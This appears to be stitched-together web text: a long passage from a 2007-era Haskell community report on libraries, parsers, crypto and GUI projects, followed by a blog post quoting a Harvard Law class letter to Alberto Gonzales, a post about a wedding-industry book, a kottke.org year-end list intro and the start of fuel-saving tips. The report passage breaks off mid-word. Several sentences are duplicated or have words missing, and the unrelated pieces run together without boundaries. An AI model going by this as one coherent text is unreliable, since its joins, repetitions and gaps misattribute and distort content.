3.3.7 Uniqueness Typing in EHC Report by : Arie Middelkoop Participants : Arie Middelkoop , Jurriaan Hage Status : Prototype finished Uniqueness typing is a type system feature of the functional programming language Clean to identify unique values .
The space these values occupy can be recycled directly after their only use , thus enabling a form of static garbage collection that greatly improves the efficiency of functional programs .
Our goal is to take this idea , and use it to produce more efficient Haskell code .
This project consists of two parts : an analysis to determine which values are unique ( front- end ) , and a code specializer that uses the analysis results to optimize memory management ( back - end ) .
We did focus on the front - end part and implemented a prototype using the Essential Haskell ( →3.3.5 ) project as a research vehicle .
Code generation is ongoing work of the Essential Haskell project , and we intent to integrate the results of the uniqueness analysis in a later phase .
Our uniqueness analyzer works as follows .
Each type constructor of a well - typed program is annotated with a fresh identifier called the uniqueness annotation .
From the structure of the AST , we generate a bunch of constraints between these annotations .
Solving the constraints gives a local reference count ( taking the current slice of the program into account ) and global reference count ( taking the whole program into account ) of each annotation .
The global reference count is constructed from the local reference counts and serves as an approximation of an upper bound to the actual usage of a value .
( Sub ) values that end up with an upper bound are considered unique , others are shared .

3.3.8 Object - Oriented Haskell Report by : Glenn Strong Status : ongoing A set of type and other extensions to a Haskell - derived language to support the general notion of Object - Oriented programming .
An interpreter is under construction to provide a programming environment .
No public release is currently available as the system is not yet usable .
3.4 IO
3.4.1 Formal Aspects of Pure Functional I/O Report by : Andrew Butterfield Participants : Andrew Butterfield , Glenn Strong , Malcolm Dowse Status : ongoing
We are particularly interested in formal models of the external effects of I/O in pure lazy functional languages .
The emphasis is on reasoning about how programs affect their environment , rather than the issue of which programs have identical I /O behaviour .

4 Libraries
4.1 Packaging and Distribution
4.1.1 Core Report by : Bulat Ziganshin Status : experimental
Thanks to Cabal , we can now easily upgrade any installed library to a new version .
There is only one exception : the Base library is closely tied to compiler internals , so you cannot use the Base library shipped with GHC 6.4 in GHC 6.6 and vice versa .
The Core library is a project of dividing the Base library into two parts – a small compiler - specific one ( the Core library proper ) and the rest – a new , compiler - independent Base library that uses only services provided by the Core lib .
Then , any version of the Base library can be used with any version of the Core library , i.e. with any compiler .
Moreover , it means that the Base library will become available for the new compilers , like yhc ( →2.4 ) and jhc – this will require adding to the Core lib only a small amount of code implementing low - level compiler - specific functionality .
The Core library consists of directories GhcCore , HugsCore … implementing compiler - specific functionality and Core directory providing common interface to this functionality , so that external libs should import only Core . * modules in order to be compiler - independent .
In practice , the implementation of the Core lib became a refactoring of the GHC .* modules by splitting them into GHC - specific and compiler - independent parts .
Adding implementations of compiler - specific parts for other compilers will allow us to compile the refactored Base library with any compiler , including old versions of GHC .
At this moment , the following modules were succesfully refactored : GHC .
Arr , GHC .
Base , GHC .
Enum , GHC .
Float , GHC .
List , GHC .
Num , GHC .
Real , GHC .
Show , GHC.ST , GHC.STRef ; the next step is to refactor IO functionality .

4.2 General libraries
4.2.1 Test.IOSpec Report by : Wouter Swierstra Status : active development The Test.IOSpec library provides a pure specification of several functions in the IO monad .
This may be of interest to anyone who wants to debug , reason about , analyse , or test impure code .
The Test.IOSpec library is essentially a drop - in replacement for several other modules , most notably Data .
IORef and Control .
Concurrent .
Once you ’re satisfied that your functions are reasonably well - behaved with respect to the pure specification , you can drop the Test .
IOSpec import in favour of the “ real ” IO modules .
There ’s still quite some work to be done .
First and foremost , I ’d like to make it easier to combine different modules .
Furthermore , I ’d also like to add new modules providing specifications of other parts of the IO monad : Control .
Concurrent .STM and Control .
Exception are two prime candidates .
If you use Test .
IOSpec for anything useful at all , I ’d love to hear from you .

The PFP library is a collection of modules for Haskell that facilitates probabilistic functional programming , that is , programming with stochastic values .
The probabilistic functional programming approach is based on a data type for representing distributions .
A distribution represent the outcome of a probabilistic event as a collection of all possible values , tagged with their likelihood .
A nice aspect of this system is that simulations can be specified independently from their method of execution .
That is , we can either fully simulate or randomize any simulation without altering the code which defines it .
The library was developed as part of a simulation project with biologists and genome researchers .
We originally had planned to apply the library to more examples in this area , however , the student working in this area has left , so this project is currently in limbo .
No changes since the last report .
For the next version , some refactorings are planned .
Several variations of this library seem to have evolved .
Somebody is also working on a documentation .
Maybe all the different threads should be brought together on one web page ?

GSLHaskell is a simple library for linear algebra and numerical computation , internally implemented using GSL , BLAS and LAPACK .
The goal is to achieve the functionality and performance of GNU - Octave and similar systems .
Recent dev elopments include important bugfixes and the interface to additional LAPACK functions .
A brief manual is available at the URL below .
This library is used in the easyVision project ( →6.19 ) .

The index aware linear algebra library is a Haskell interface to a set of common vector and matrix operations .
The interface exposes index types to the type system so that operand conformability can be statically guaranteed .
For instance , an attempt to add or multiply two incompatibly sized matrices is a static error .
The library should still be considered alpha quality .
A backend for sparse vector types is near completion , which allows low - overhead “ views ” of tensors as arbitrarily nested vectors .
For instance , a matrix , which we represent as a tuple - indexed vector , could also be seen as a ( rank 1 ) vector of ( rank 1 ) vectors .
These different views usually produce different behaviours under common vector operations , thus increasing the expressive power of the interface .

4.2.5 Haskell Rules : Embedding Rule Systems in Haskell Report by : Martin Erwig Participants : Steve Kollmansberger Status : mostly stable Haskell Rules is a domain - specific embedded language that allows semantic rules to be expressed as Haskell functions .
This DSEL provides logical variables , unification , substitution , non-determinism , and backtracking .
It also allows Haskell functions to be lifted to operate on logical variables .
These functions are automatically delayed so that the substitutions can be applied .
The rule DSEL allows various kinds of logical embedding , for example , including logical variables within a data structure or wrapping a data structure with a logical wrapper .
No changes since last report .
No plans for future versions .

4.3 Parsing and transforming
4.3.1 InterpreterLib Report by : Jennifer Streb Participants : Garrin Kimmell , Nicolas Frisby , Mark Snyder , Philip Weaver , Jennifer Streb , Perry Alexander Maintainer : Garrin Kimmell , Nicolas Frisby Status : beta , actively developed The InterpreterLib library is a collection of modules for constructing composable , monadic interpreters in Haskell .
The library provides a collection of functions and type classes that implement semantic algebras in the style of Hutton and Duponcheel .
Datatypes for related language constructs are defined as non-recursive functors and composed using a higher - order sum functor .
The full AST for a language is the least fixed point of the sum of its constructs ’ functors .
To denote a term in the language , a sum algebra combinator composes algebras for each construct functor into a semantic algebra suitable for the full language and the catamorphism introduces recursion .
Another piece of InterpreterLib is a novel suite of algebra combinators conducive to monadic encapsulation and semantic re-use .
The Algebra Compiler , an ancillary preprocessor derived from polytypic programming principles , generates functorial boilerplate Haskell code from minimal specifications of language constructs .
As a whole , the InterpreterLib library enables rapid prototyping and simplified maintenance of language processors .
InterpreterLib is available for download at the link provided below .
Version 1.0 of InterpreterLib was released in April 2007 .

4.3.2 hscolour Report by : Malcolm Wallace Status : stable , maintained HsColour is a small command - line tool ( and Haskell library ) that syntax - colorises Haskell source code for multiple output formats .
It consists of a token lexer , classification engine , and multiple separate pretty - printers for the different formats .
Current supported output formats are ANSI terminal codes , HTML ( with or without CSS ) , and LaTeX .
In all cases , the colours and highlight styles ( bold , underline , etc ) are configurable .
It can additionally place HTML anchors in front of declarations , to be used as the target of links you generate in Haddock documentation .
HsColour is widely used to make source code in blog entries look more pretty , to generate library documentation on the web , and to improve the readability of ghc ’s intermediate - code debugging output .

The Utrecht attribute grammar system has been extended : the attribute flow analysis has been completely implemented by Joost Verhoog , and it is now possible to generate visit - function based evaluators , which are much faster and use less space .
We assume that such functions are strict in all their arguments , and generate the appropriate `seq` calls to make the GHC aware of this .
As a result also case ’s are generated instead on let ’s wherever possible .
Since the last report several improvements were made : better error reporting of cyclic dependencies , and a large speed improvements in the overall flow analysis have been made .
The first versions of the EHC now compile without circularities , nor direct nor induced by fixing the attribute evaluation orders
calls to make the GHC aware of this .
As a result also ’s are generated instead on ’s wherever possible .
we are adding better support for higher order attribute grammars and forwarding rules
Tthe error correcting strategies of the parser combinators are now being used as a base for providing automatic feedback in systems for training strategies ( Johan Jeuring , Arthur van Leeuwen )
a start has been made with providing Haddock information with the code of the parser combinators
we plan to enhance the parser combinators with a second basic parsing engine , in order to support monadic uses of the combinators while keeping the error correcting capabilities
The software is again available through the Haskell Utrecht Tools page .

4.3.4 Left - Recursive Parser Combinators Report by : Richard A. Frost Participants : Rahmatullah Hafiz , Paul Callaghan Status : Pre-release Existing parser combinators cannot accommodate left - recursive grammars .
In some applications , this shortcoming requires grammars to be rewritten to non-left - recursive form which may hinder definition of the associated semantic functions .
In applications that involve ambiguous pattern - matching , such as NLP , the rewriting to non-left - recursive form may result in loss of parses .
In our project , we have developed combinators which accommodate ambiguity and left - recursion ( both direct and indirect ) in polynomial time , and which generate polynomial - sized representations of the exponential number of parse trees corresponding to highly - ambiguous input .
The compact representations are similar to those generated by Tomita ’s algorithm .
Polynomial complexity for ambiguous grammars is achieved through memoization of fully - backtracking combinators .
Systematic memoization is implemented using monads .
Direct left - recursion is accommodated by storing additional data in the memotable which is used to curtail recursive descent when no parse is possible .
Indirect left recursion is accommodated by use of the context in which results are created and the context in which they are subsequently considered for re-use .
We have implemented our approach in Haskell , and are in the process of optimizing the code and preparing it for release in December of 2006 .

4.3.5 RecLib – A Recursion and Traversal Library for Haskell Report by : Martin Erwig Participants : Deling Ren Status : mostly stable The Recursion Library for Haskell provides a rich set of generic traversal strategies to facilitate the flexible specification of generic term traversals .
The underlying mechanism is the Scrap Your Boilerplate ( SYB ) approach .
Most of the strategies that are used to implement recursion operators are taken from Stratego .
The library is divided into two layers .
The high - level layer defines a universal traverse function that can be parameterized by five aspects of a traversal .
The low - level layer provides a set of primitives that can be used for defining more traversal strategies not covered in the library .
Two fixpoint strategies inntermost and outermost are defined to demonstrate the usage of the primitives .
The design and implementation of the library is explained in a paper listed on the project web page .
No changes since last report .
No plans for future versions .

4.4 System
4.4.1 Harpy Report by : Martin Grabmüller and Dirk Kleeblatt Status : experimental Harpy is a library for run -time code generation of IA - 32 machine code .
It provides not only a low level interface to code generation operations , but also a convenient domain specific language for machine code fragments , a collection of code generation combinators and a disassembler .
We use it in two independent ( unpublished ) projects :
On the one hand , we are implementing a just - in - time compiler for functional programs , on the other hand , we use it to implement an efficient type checker for a dependently typed language .
It might be useful in other domains , where specialised code generated at run-time can improve performance .
Harpy ’s implementation makes use of the foreign function interface , but only contains functions written in Haskell .
Moreover , it has some uses of other interesting Haskell extensions as for example multi-parameter type classes to provide an in - line assembly language , and Template Haskell to generate stub functions to call run-time generated code .
The disassembler uses Parsec to parse the instruction stream .
We intend to implement supporting operations for garbage collectors cooperating with run-time generated code .
We made an initial public release , and are now looking forward to ideas from the community to show some further uses of run-time code generation in Haskell .

Nicholas Burlett has now created a cabalized version and made it available on hackage .
However , beware that this does n’t use autoconf to check your system supports sa_len and it does n’t check which version of libpcap is installed .
It will probably work but may not .
If it does n’t then try this : darcs get
http://www.haskell.org/networktools/src/pcap
Install libpcap .
I used 0.9.4 .
autoheader
autoconf
./ configure

ghc -o test test.hs -- make - lpcap - fglasgow - exts
All contributions are welcome especially if you know how to get cabal to run autoconf and check for versions of non-Haskell libraries .
4.4.4 Streams Report by : Bulat Ziganshin Status : beta , actively developed Streams is the new I/O library developed to extend existing Haskell ’s Handle - based I /O features .
It includes : Hugs ( →2.2 ) and GHC ( →2.1 ) compatibility
Lightning speed ( up to 100 times faster than Handle - based I/O )
UTF - 8 and other Char encodings for text I/ O
Various stream types ( files , memory - mapped files , memory and string buffers , pipes )
Binary I/O and serialization facilities ( see AltBinary lib ( →4.7.1 ) )
Support for streams working in IO , ST and other monads
The main idea of the library is its clear class - based design that allows to split all functionality into a set of small maintainable modules , each of which supports one type of streams ( file , memory buffer … ) or one feature ( locking , buffering , Char encoding … ) .
The interface of each such module is fully defined by some type class ( Stream , MemoryStream , TextStream ) , so the library can be easily extended by third party modules that implement additional stream types ( network sockets , array buffers … ) and features ( overlapped I/O … ) .
The new version 0.2 adds support for memory - mapped files , files > 4GB on Windows , ByteString I/O , full backward compatibility with the NewBinary library ( both byte - aligned and bit- aligned modes ) , more orthogonal serialization API , serialization from / to memory buffer , and even better speed .
Sorry , it was never documented
The upcoming version 0.3 will provide automatic buffer deallocation using ForeignPtrs , serialization from / to ByteStrings , full backward compatibility with Handle - base I/O and , hopefully , full documentation for all its features .

4.4.6 hinotify Report by : Lennart Kolmodin Status : alive hinotify is a simple Haskell wrapper for the Linux kernel ’s inotify mechanism .
inotify allows applications to watch file changes since Linux kernel 2.6.13 .
You can for example use it to do a proper locking procedure on a set of files , or keep your application up do date on a directory of files in a fast and clean way .
hinotify is still a very young library and might still be a bit rough around the edges .
Next updates will include non-threading support and perhaps a little reworked API .

4.5 Databases and data storage
4.5.1 CoddFish Report by : Alexandra Silva and Joost Visser
The CoddFish library provides a strongly typed model of relational databases and operations on them , which allows for static checking of errors and integrity at compile time .
Apart from the standard relational database operations , it allows the definition of functional dependencies and , therefore , provides normal form verification and database transformation operations .
The library makes essential use of the HList library ( →4.6.6 ) , which provides arbitrary - length tuples ( or heterogeneous lists ) , and makes extensive use of type - level programming with multi-parameter type classes .
CoddFish lends itself as a sandbox for the design of typed languages for modeling , programming , and transforming relational databases .
Currently , a reimplementation of CoddFish based on GADTs is underway .

Takusen is a library for accessing DBMS’s .
Like HSQL , we support arbitrary SQL statements ( currently strings , extensible to anything that can be converted to a string ) .
Takusen ’s ‘ unique - selling - point ’ is safety and efficiency .
We statically ensure all acquired database resources such as cursors , connection and statement handles are released , exactly once , at predictable times .
Takusen can avoid loading the whole result set in memory and so can handle queries returning millions of rows , in constant space .
Takusen also supports automatic marshalling and unmarshalling of results and query parameters .
These benefits come from the design of query result processing around a left - fold enumerator .
Currently we fully support Oracle , Sqlite , and PostgreSQL .
Since the last report we have : added support for re-usable connections , which should help applications that want to implement a connection pool
improved the installation process , and added a README file
replaced the buggy UTF8 module with a correct , tested module
support for Oracle output bind variables and cursor result - sets
various bug - fixes , including : Postgres execDML failures , Postgres bound statement failures , Sqlite execDML rowcount incorrect .
Future plans ODBC interface .
Work has started on this .
MS SQL Server interface , via COM .

4.6 Data types and data structures
4.6.1 Standard Collection Libraries Report by : Jean - Philippe Bernardy Status : beta , maintained Haskell implementations come with modules to handle Maps , Sets , and other common data structures .
We call these modules the Standard Collection Libraries .
The goal of this project is to improve on those .
Beside incremental improvement of the current code ( stress testing , ironing bugs out , small improvements of API , … ) , a package has been created to gather collection - related code that would not fit in the base package yet .
This includes changes that are either potentially de-stabilizing , controversial or otherwise experimental .
This new package features notably : New data structures , including AVL - tree based Maps and Sets ( thanks to Adrian Hey ) ;
A class - based framework for collection data - types , equipped with polymorphic testsuite and benchmarks .
The collection package is ready for experimental use by the Haskell community .
An important difference with other collection frameworks is that this one is intended as an evolution rather that a revolution .
It should be easy to migrate code from using Data .
Map / Set to the new framework .
Future plans include :
Add more trie - based data structures ;
Port the class framework to associated types .

Data .
ByteString provides packed strings ( byte arrays held by a Foreign Ptr ) , along with a list interface to these strings .
It lets you do extremely fast IO in Haskell ; in some cases , even faster than typical C implementations , and much faster than [ Char ] .
It uses a flexible “ foreign pointer ” representation , allowing the transparent use of Haskell or C code to manipulate the strings .
Data .
ByteString is written in Haskell98 plus the foreign function interface and cpp .
It has been tested successfully with GHC 6.4 and 6.6 , Hugs 2005 –2006 , and the head version of nhc98 .
Work on Data .
ByteString continues .
In particular , a new fusion mechanism , stream fusion , has been developed , which should further improve performance of ByteStrings .
This work is described in the recent “ Stream Fusion : From Lists to Streams to Nothing at All ” paper .
Data .
ByteString has recently been ported to nhc98 .

4.6.4 dimensional Report by : Bjorn Buckwalter Status : active , unstable Dimensional is a library providing data types for performing arithmetic with physical quantities and units .
Information about the physical dimensions of the quantities / units is embedded in their types and the validity of operations is verified by the type checker at compile time .
The boxing and unboxing of numerical values as quantities is done by multiplication and division with units .
The library is designed to , as far as is practical , enforce / encourage best practices of unit usage .
Dimensional is currently in a pre-1.0 state and is being actively developed .
The most recent release can be downloaded from the project web site ( follow url below ) .
Immediate plans include adding more units , tightening exports and getting the library in shape for a 1.0 release ( patches are welcome ) .
The library name and module hierarchy are likely to change before the 1.0 release .
For more details see the “ Issues ” section of the project web site .
Further reading http://code.google.com/p/dimensional/
The hierarchy of numerical type classes is revised and oriented at algebraic structures .
Axiomatics for fundamental operations are given as QuickCheck properties , superfluous super - classes like Show are removed , semantic and representation - specific operations are separated , the hierarchy of type classes is more fine grained , and identifiers are adapted to mathematical terms .
There are both certain new type classes representing algebraic structures and new types of mathematical objects .
Currently supported algebraic structures are group ( additive ) ,
ring ,
principal ideal domain ,
field ,
algebraic closures ,
transcendental closures ,
module and vector space ,
normed space ,
lattice ,
differential algebra ,
monoid .
There is also a collection of mathematical object types , which is useful both for applications and testing the class hierarchy .
The types are complex number , quaternion ,
residue class ,
fraction ,
partial fraction ,
numbers equipped with physical units ( dynamic checks only ) ,
fixed point arithmetic with respect to arbitrary bases and numbers of fraction digits ,
infinite precision number in an arbitrary positional system as lazy lists of digits supporting also numbers with terminating representations ,
polynomial , power series , Laurent series
series root set of a polynomial ,
matrix ( basics only ) ,
algebra , e.g. multi-variate polynomial ( basics only ) ,
permutation group .
Due to Haskell ’s flexible type system , you can combine all these types , e.g. fractions of polynomials , residue classes of polynomials , complex numbers with physical units , power series with real numbers as coefficients .
Due to Haskell ’s flexible type system , you can combine all these types , e.g. fractions of polynomials , residue classes of polynomials , complex numbers with physical units , power series with real numbers as coefficients .
Using the revised system requires hiding some of the standard functions provided by Prelude , which is fortunately supported by GHC ( →2.1 ) .
The library has basic Cabal support and a growing test - suite of QuickCheck tests for the implemented mathematical objects .
Future plans Collect more Haskell code related to mathematics , e.g. for linear algebra .
Study of alternative numeric type class proposals and common computer algebra systems .
Ideally each data type resides in a separate module .
However this leads to mutual recursive dependencies , which cannot be resolved if type classes are mutually recursive .
We start to resolve this by fixing the types of some parameters of type class methods .
E.g. power exponents become simply Integer instead of Integral , which has also the advantage of reduced type defaulting .
A still unsolved problem arises for residue classes , matrix computations , infinite precision numbers , fixed point numbers and others .
It should be possible to assert statically that the arguments of a function are residue classes with respect to the same divisor , or that they are vectors of the same size .
Possible ways out are encoding values in types or local type class instances .
The latter one is still neither proposed nor implemented in any Haskell compiler .
The modules are implemented in a way to keep all options open .
That is , for each number type there is one module implementing the necessary operations which expect the context as a parameter .
Then there are several modules which provide different interfaces through type class instances to these operations .

HList is a comprehensive , general purpose Haskell library for typed heterogeneous collections including extensible polymorphic records and variants .
HList is analogous of the standard list library , providing a host of various construction , look - up , filtering , and iteration primitives .
In contrast to the regular lists , elements of heterogeneous lists do not have to have the same type .
HList lets the user formulate statically checkable constraints : for example , no two elements of a collection may have the same type ( so the elements can be unambiguously indexed by their type ) .
An immediate application of HLists is the implementation of open , extensible records with first - class , reusable , and compiled - time only labels .
The dual application is extensible polymorphic variants ( open unions ) .
HList contains several implementations of open records , including records as sequences of field values , where the type of each field is annotated with its phantom label .
We and now others ( Alexandra Silva , Joost Visser : PURe .
CoddFish project ( →4.5.1 ) ) have also used HList for type - safe database access in Haskell .
HList - based Records form the basis of OOHaskell http://darcs.haskell.org/OOHaskell.
The HList library relies on common extensions of Haskell 98 .
The HList repository is available via Darcs ( →6.10 ) : http://darcs.haskell.org/HList Einar Karttunen has made adjustments to HList for GHC 6.6 and Cabalized it .

4.7.2 binary Report by : Lennart Kolmodin Participants : Duncan Coutts , Don Stewart , Binary Strike Team Status : active The Binary Strike Team is pleased to announce the release of a new , pure , efficient binary serialisation library .
The ’ binary ’ package provides efficient serialisation of Haskell values to and from lazy ByteStrings .
ByteStrings constructed this way may then be written to disk , written to the network , or further processed ( e.g. stored in memory directly , or compressed in memory with zlib or bzlib ) .
The binary library has been heavily tuned for performance , particularly for writing speed .
Throughput of up to 160M / s has been achieved in practice , and in general speed is on par or better than NewBinary , with the advantage of a pure interface .
Efforts are underway to improve performance still further .
Plans are also taking shape for a parser combinator library on top of binary , for bit parsing and foreign structure parsing ( e.g. network protocols ) .
Data .
Derive ( →5.3.1 ) has support for automatically generating Binary instances , allowing to read and write your data structures with little fuzz .
Binary was developed by a team of 8 during the Haskell Hackathon , and since then has in total 15 people contributed code and many more given feedback and cheerleading on #haskell .
The underlying code is currently being rewritten to give even better performance – both reading and writing – still exposing the same API .
The package is is available through Hackage .

4.7.3 binarydefer Report by : Neil Mitchell
The Binary Defer library provides a framework for doing binary serialisation , with support for deferred loading .
Deferred loading is for when a large data structure exists , but typically only a small fraction of this data structure will be required .
By using deferred loading , some of the data structure can be read quickly , and the rest can be read on demand , in a pure manner .
This library is at the heart of Hoogle 4 ( →5.5.7 ) , but has already found uses outside that application , including to do offline sorts etc .

4.7.4 Compression -2006 ( was : Compression - 2005 ) Report by : Bulat Ziganshin Status : stable Features of the Compression - 2006 Library : easy and uniform access to most competitive compression algorithms as of November ’06 : LZMA , PPMd and GRZip
all input / output performed via user - supplied functions ( callbacks ) , so you can compress data in memory , files , pipes , sockets and anything else
all parameters of compression algorithm are defined with a single string , for example " lzma:8 mb:fast:hc4:fb32 " .
So , the entire compression program can be written as a one - liner : compressWithHeader
" ppmd:10:48 mb " ( hGetBuf stdin ) ( hPutBuf stdout )
with decompressor program : decompressWithHeader
( hGetBuf stdin ) ( hPutBuf stdout )
You can replace " ppmd:10:48 mb " with " lzma : 16 mb " or " grzip " to get another two compressors – all three will compress faster and better than bzip2 .
with decompressor program :
You can replacewithorto get another two compressors – all three will compress faster and better than bzip2 .
Of course , the primary purpose of this library is to give you a possibility to use state - of - the - art compression as an integral part of your Haskell programs .
Compared to the previous version , I have upgraded the LZMA part of the library to use the LZMA 4.43 library that significantly improved the speed and compression ratio over old versions .

Following the Haskell hackathon
http://haskell.org/haskellwiki/Hac_2007, there is now a new release of the library , 4.0.3 , which contains only the cryptographic functions and not the functions to handle ASN.1 , X.509 , PKCS # 8 and PKCS # 1.5 .
This means no dependency on NewBinary which had been requested by several people .
Very limited details of an embryonic version of the ASN.1 library ( 4.7.6 ) are available from http://haskell.org/asn1.
The interface to SHA - 1 is still different from MD5 and the whole library needs a rethink .
Unfortunately , I do n’t have the time to undertake much work on it at the moment and it is not clear when I will have more time .
I ’m therefore looking for someone to help keeping the repository up - to - date with contributions , re-structuring the library and managing releases .
I have restructured SHA - 1 to be more Haskell - like and it ’s now obvious how it mirrors the specification .
However , this has led to rather poor performance and it ’s not obvious ( to me at least ) what can be done without sacrificing clarity .
This release contains : DES
Blowfish
AES
Cipher Block Chaining ( CBC )
PKCS#5 and nulls padding
SHA-1
MD5
RSA
OAEP - based encryption ( Bellare - Rogaway ) Further reading http://www.haskell.org/crypto

4.7.6 The Haskell ASN.1 Library Report by : Dominic Steinitz Following the Haskell hackathon
http://haskell.org/haskellwiki/Hac_2007, there is now a release of the ASN.1 library , 0.0.1 , which contains functions to handle ASN.1 , X.509 , PKCS # 8 and PKCS # 1.5 .
This still has a dependency on NewBinary .
The current version handles the Basic Encoding Rules ( BER ) only .
I am currently thinking about how to make it handle the Packed Encoding Rules .
This will require handling subtype constraints which are currently not supported ( they are ignored in BER ) .
This release supports : X.509 identity certificates
X.509 attribute certificates
PKCS # 8 private keys
PKCS #1 version 1.5 Further reading http://haskell.org/asn1.
4.7.7 2LT : Two - Level Transformation Report by : Joost Visser Participants : Pablo Berdaguer , Alcino Cunha , JoséNuno Oliveira , Hugo Pacheco Status : active A two - level data transformation consists of a type - level transformation of a data format coupled with value - level transformations of data instances corresponding to that format .
Examples of two - level data transformations include XML schema evolution coupled with document migration , and data mappings used for interoperability and persistence .
In the 2LT project , support for two - level transformations is being developed using Haskell , relying in particular on generalized abstract data types ( GADTs ) .
Currently , the 2LT package offers : A library of two - level transformation combinators .
These combinators are used to compose transformation systems which , when applied to an input type , produce an output type , together with the conversion functions that mediate between input and out types .
Front-ends for XML and SQL .
These front - ends support ( i ) reading a schema , ( ii ) applying a two - level transformation system to produce a new schema , ( iii ) convert a document / database corresponding to the input schema to a document / database corresponding to the output schema , and vice versa .
Referential constraints and primary key information are propagated through the schema transformation .
. Referential constraints and primary key information are propagated through the schema transformation .
A combinator library for transformation of point - free and structure - shy functions .
These combinators are used to compose transformation systems for optimization of conversion functions , and for migration of queries through two - level transformations .
Independent of two - level transformation , the combinators can be used to specializes structure - shy programs ( such as XPath queries and strategic functions ) to structure - sensitive point - free from , and vice versa .
The various sets of transformation combinators are reminiscent of the combinators of Strafunski and the Scrap - your - Boilerplate approach to generic functional programming .
The various sets of transformation combinators are reminiscent of the combinators of Strafunski and the Scrap - your - Boilerplate approach to generic functional programming .
A release of 2LT is available as part of the UMinho Haskell Libraries , and as stand - alone release .
The release includes worked out examples of schema evolution and hierarchical - relational mappings .
Efforts are underway to add further front - ends to 2LT , e.g. for XPath and VDM -SL , and to extend the SQL front - end .

4.8 User interfaces
4.8.1 Grapefruit – A declarative GUI library Report by : Wolfgang Jeltsch Participants : Wolfgang Jeltsch , Matthias Reisner , Daniel Skoraszewsky Status : provisional Grapefruit is a library for creating graphical user interfaces in a declarative way .
It is currently based on Gtk2Hs ( →4.8.3 ) but implementations on top of other GUI libraries are planned for the future .
Grapefruit makes it possible to implement graphical user interfaces by describing them as systems of interconnected components .
Components can be visible components like widgets and windows but also invisible components which provide certain control functionality .
Component systems can be build from components by using methods from the Arrow and ArrowLoop classes .
Components communicate via signals and event streams .
A signal denotes a time - dependent value , and an event stream denotes a sequence of events occurring at discrete points in time .
Several functions allow the construction of signals and event streams in a purely functional manner .
With Grapefruit , user interface descriptions always co

And Gonzales 's fellow graduates from Harvard Law School 's Class of 1982 took out a full page ad in the Washington Post to express their dismay that their highest profile alumnus appears to have the least grasp on constitutionality and legal ethics .
That 's gotta hurt .
The next reunion is going to be SO tense ....
Democratic Underground :
Dear Attorney General Gonzales :
Twenty - five years ago we , like you , graduated from Harvard Law School .
While we arrived via many different paths and held many different views , we were united in our deep respect for the Constitution and the rights it guaranteed .
As members of the post - Watergate generation who chose careers in law , we understood the strong connection between our liberties as Americans and the adherence of public officials to the law of the land .
We knew that the choice to abide by the law was even more critical when public officials were tempted to take legal shortcuts .
Nowhere were we taught that the ends justified the means , or that freedoms for which Americans had fought and died should be set aside when inconvenient or challenging .
To the contrary : our most precious freedoms , we learned , need defending most in times of crisis .
So it has been with dismay that we have watched your cavalier handling of our freedoms time and again .
When it has been important that legal boundaries hold unbridled government power in check , you have instead used pretextual rationales and strained readings to justify an ever - expanding executive authority .
Witness your White House memos sweeping aside the Geneva Conventions to justify torture , endangering our own servicemen and women ; witness your advice to the President effectively reading Habeas Corpus out of our constitutional protections ; witness your support of presidential statements claiming inherent power to wiretap American citizens without warrants ( and the Administration ’s stepped - up wiretapping campaign , taking advantage of those statements , which continues on your watch to this day ) ; and witness your dismissive explanation of the troubling firings of numerous U.S. Attorneys , and their replacement with others more " loyal " to the President ’s politics , as merely " an overblown personnel matter . "
In these and other actions , we see a pattern .
As a recent editorial put it , your approach has come to symbolize " disdain for the separation of powers , civil liberties and the rule of law . "
As lawyers , and as a matter of principle , we can no longer be silent about this Administration 's consistent disdain for the liberties we hold dear .
Your failure to stand for the rule of law , particularly when faced with a President who makes the aggrandized claim of being a unitary executive , takes this country down a dangerous path .
Oh snap !

Why Marry ?
Rebecca Mead , whom I am proud to call a longtime friend , is a staff writer for the New Yorker .
In addition to being a very good reporter , she ’s also a very good stylist ; this is a rare and blessed combination .
She has just published her first book , One Perfect Day : The Selling of the American Wedding , which is full of interesting stuff .
For instance :
Every year , as might be expected , the American Wedding Study ’s* tally of the amount spent by Americans on getting married increases : from about $ 22,000 in 2003 to more than $ 26,000 in 2005 to , in 2006 , a grand total of $ 27,852 … According to the 2006 study , Americans were spending $ 14 billion annually on engagement rings , wedding rings , and other items of jewelry .
They were purchasing just over $ 7 billion worth of wedding gowns , tuxedos , flower girl outfits , bridesmaids ’ dresses , veils , satin shoes , gloves , stoles , and other items of wedding attire .
Brides and grooms were registering for $ 9 billion worth of gifts from their friends and relatives , of whom there were an average of 165 at each wedding .
The expenses of the wedding day itself , including the food and drink , the limousines , the flowers , the wedding bands , and other nuptial paraphernalia , totaled $ 39 billion , which comes to [ $ 750 million ] being spent on weddings across America every weekend ( with the exception of Super Bowl weekend , when only the oblivious or highly inconsiderate decide to begin married life ) .
A further $ 8.5 billion were being spent on honeymoon vacations .
I have just started the book , so I am not sure if Rebecca addresses the question I find most compelling about weddings :
Why are there still so many of them ?
I do n’t mean why are there so many big , expensive weddings of the sort that Rebecca chronicles — but why , when the advantages of marriage itself in this country seem to be not much greater than in other countries where many forgo it ( c.f. Ségolene Royal , the recent runner - up in France ’s presidential race ) — why do so many people still get married all ?
There are obviously a lot of good and true reasons , but I also wonder how much the herd mentality — and the wedding - industry pressure described in One Perfect Day — have to do with it .
* The American Wedding Study is , alas , conducted by Conde Nast , which is a publisher of several bridal magazines ( as well as the New Yorker ) .
Compiling a list of the best things I ’ve linked to from kottke.org seems to get harder each year .
I estimate posting about 2400 links to kottke.org in 2006 , which is roughly one link every 2.5 hours on weekdays .
Which is insane … I do n’t know how you guys read all of that .
Last year I managed to whittle down the best - of list to ~65 links ( 2004 ’s list had ~ 40 links ) , but I could n’t manage less than 100 this year .
( Hell , the overflow list contains another 100 links that did n’t quite make the cut…hopefully I ’ll be posting those in a few days . )
But enough with the statistics .
Besides containing some really entertaining , informative , and provoking reading / viewing material , this list also functions as kottke.org ’s year in ideas for 2006 , akin to the annual list in the NY Times Magazine .
Climate change , the industrialization of childbirth , race & class in college & professional sports , the inherent messiness of science , adults who do n’t want to grow up , the role of journalism in the age of information abundance , and how creative work gets done are all ideas represented in the links below .
Even the funny YouTube videos signal the arrival in 2006 of online video , especially if you throw Ze Frank in the mix .

Top ten fuel saving tips
News , Featured
on 05/12/2006
Filed under :on 05/12/2006
As petrol continues to rise in price , there has never been a better time to think about eco-driving .
Regardless of the vehicle you are driving , there are techniques you can use to save fuel and to minimise your impact on the environment .
1 . Ask yourself : " Do I really need to drive ? "
It 's the shortest journeys - less than two miles - which cause the most pollution and are inefficient in terms of fuel consumption .
